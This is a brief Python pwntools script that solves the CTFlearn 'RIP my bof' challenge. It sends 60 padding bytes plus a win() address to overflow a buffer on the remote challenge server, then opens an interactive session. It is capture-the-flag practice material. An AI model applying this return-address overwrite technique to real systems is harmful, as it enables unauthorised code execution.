"""
Written by WENG XINN CHOW on 07.04.2022
Buffer overflow script for  RIP my bof  CTFlearn
"""

from pwn import *

# 60 underscores and win() address
s = b"\x5f" * 60 + b"\x86\x85\x04\x08"

# port = 4902
p = remote("thekidofarcrania.com", 4902)
p.recv()
p.sendline(s)
p.interactive()